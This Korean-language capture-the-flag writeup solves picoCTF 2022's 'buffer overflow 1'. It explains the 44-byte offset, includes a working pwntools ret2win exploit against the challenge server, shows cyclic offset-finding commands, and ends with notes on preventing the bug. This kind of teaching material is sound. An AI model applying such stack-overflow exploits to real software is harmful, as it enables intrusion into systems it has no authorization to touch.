---
title: buffer overflow 1 — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-21
type: query
tags: [ctf, pwn, stack-overflow, ret2win, saved-return-address, picoctf]
sources: [https://colej.net/picoctf-2022-buffer-overflow-1, https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-1-3e48f4a61876, https://ctftime.org/writeup/32919]
confidence: high
---

# buffer overflow 1 — picoCTF 2022 pwn writeup

> `buffer overflow 1`은 **32-byte 버퍼를 overflow해서 saved return address를 `win()`으로 바꾸는 picoCTF 2022 Binary Exploitation 문제**입니다. 가장 기본적인 **ret2win** 유형입니다.

## 참고 URL
- [colej.net](https://colej.net/picoctf-2022-buffer-overflow-1)
- [medium.com](https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-1-3e48f4a61876)
- [CTFtime writeup](https://ctftime.org/writeup/32919)


## 1. 핵심 요약

- 바이너리는 **32-bit x86**입니다.
- `gets()`로 입력을 받아 버퍼를 overflow할 수 있습니다.
- `win()` 함수가 별도로 존재하며, 그 주소로 돌아가면 flag를 읽습니다.
- 오프셋은 **44 bytes**입니다.
- 보호 기법이 거의 없어 가장 단순한 ret2win으로 풀립니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / ret2win |
| 아키텍처 | 32-bit x86 |
| 핵심 요소 | saved return address overwrite |
| 오프셋 | 44 |
| 목표 | `win()` 호출 |

## 3. 공격 흐름

1. `vuln()`의 `gets()`를 이용해 버퍼를 overflow합니다.
2. saved return address 위치까지 44바이트를 채웁니다.
3. `win()` 함수 주소를 뒤에 붙입니다.
4. 함수가 리턴할 때 `win()`으로 점프합니다.
5. `win()`이 flag를 출력합니다.

## 4. 왜 가능한가

이 문제는 보호 장치가 거의 없습니다. **NX가 꺼져 있고, PIE도 없으며, canary도 없습니다.** 따라서 단순히 saved return address만 덮어도 원하는 함수로 제어 흐름을 바꿀 수 있습니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln')  # 바이너리를 로드합니다.

# 로컬/원격 실행을 선택하는 헬퍼입니다.
def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 59737)  # 원격 서비스 예시입니다.
    return process(elf.path)  # 로컬에서 실행합니다.

io = start()

offset = 44  # saved return address까지의 오프셋입니다.
win = elf.symbols['win']  # win() 함수 주소를 찾습니다.

payload = flat(
    b'A' * offset,  # 버퍼를 채웁니다.
    p32(win)        # return address를 win()으로 바꿉니다.
)

io.sendlineafter(b':', payload)  # 입력을 보냅니다.
io.interactive()                 # flag 출력 후 확인합니다.
```


## 재현 절차

1. 오프셋을 찾습니다.
```bash
# cyclic 패턴으로 saved return address 덮어쓰기 위치를 찾습니다.
python3 - <<'PY'            # 예상: 200바이트 cyclic 문자열 출력
from pwn import cyclic
print(cyclic(200).decode())
PY
```
2. 크래시 값으로 `cyclic_find`를 수행합니다.
```bash
# EIP 값을 이용해 오프셋을 역산합니다.
python3 - <<'PY'            # 예상: 정수 오프셋이 출력됩니다.
from pwn import cyclic_find
print(cyclic_find(0x6161616c))  # 예시 EIP 값입니다.
PY
```
3. `win()` 주소로 ret2win을 수행합니다.
## 6. 방어 관점 메모

- `gets()`는 사용하면 안 됩니다.
- return address가 덮이면 제어 흐름 전체가 탈취됩니다.
- 최소한 canary와 PIE를 함께 적용해야 합니다.
- 입력 길이 검증과 safe API 사용이 기본입니다.

## 7. 비교 포인트

- `buffer overflow 2`는 **ret2win with arguments**입니다.
- `buffer overflow 3`는 **stack canary brute force**입니다.
- `x-sixty-what`은 **64-bit ret2win**입니다.
- `buffer overflow 1`은 그중 가장 기본적인 **saved return address overwrite**입니다.

## 8. 참고 자료

- [PicoCTF 2022: Buffer Overflow 1](https://colej.net/picoctf-2022-buffer-overflow-1)
- [PicoCTF 2022: Buffer Overflow 1 — Medium](https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-1-3e48f4a61876)
- [CTFtime — buffer overflow 1 / Writeup](https://ctftime.org/writeup/32919)
- [[saved-return-address-control-ctf-patterns]]
- [[ret2win-with-arguments-ctf-patterns]]
